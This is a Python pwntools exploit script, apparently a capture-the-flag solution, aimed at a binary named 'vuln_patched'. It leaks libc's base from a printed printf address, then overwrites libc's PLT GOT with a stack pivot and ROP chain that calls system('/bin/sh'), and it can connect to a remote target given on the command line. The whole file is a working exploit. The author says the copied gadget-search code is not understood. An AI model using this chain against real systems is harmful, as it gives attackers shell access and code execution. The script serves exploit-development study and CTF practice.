#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pathlib import Path
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

# Set up pwntools for the correct files
exe = './vuln_patched'
elf = context.binary = ELF(exe)

libc = elf.libc

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# NOTE: Please run pwninit first!

io = start()

# Copied from: https://github.com/n132/Libc-GOT-Hijacking/blob/main/Pre/templates.md
# To be honest, I have no idea what the code is doing

class ROPgadget():
    def __init__(self, libc: ELF, base=0):
        if Path("./gadgets").exists():
            print("[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets", 'wb')
            subprocess.run(
                f"ROPgadget --binary {libc.path}".split(" "), stdout=fp)
            fp.close()
        fp = open("./gadgets", 'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0], 16), x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base = base

    def search(self, s):
        for addr, ctx in self.gadgets:
            match = re.search(s, ctx)
            if match:
                return addr+self.base
        return None


def fx2(libc: ELF, rop_chain=[], nudge=0):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop = ROPgadget(libc, libc.address)
    pivot = rop.search(r"^pop rsp ; ret")
    escape = rop.search(r"^pop rsp .*jmp rax")
    return got+8, flat(
        p64(got+8+0x38*8),  # the rop chain address
        p64(pivot),
        p64(plt0) * 0x36, flat(rop_chain+[escape])+p64(got+0x3000-nudge*8))

libc.address = int(io.recvline_startswith(b"0x"), 16) - libc.symbols["printf"]
print(f"Libc address: {hex(libc.address)}")

rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi", 'ret'])[0]
rax = rop.find_gadget(["pop rax", 'ret'])[0]
rop_chain = [rdi, libc.search(b"/bin/sh").__next__(), rax, libc.sym["system"]]
dest, payload = fx2(
    libc, rop_chain=rop_chain, nudge=1)

print(hex(dest), payload)

io.sendlineafter(b"> ", hex(dest).encode())
io.send(payload)

io.interactive()
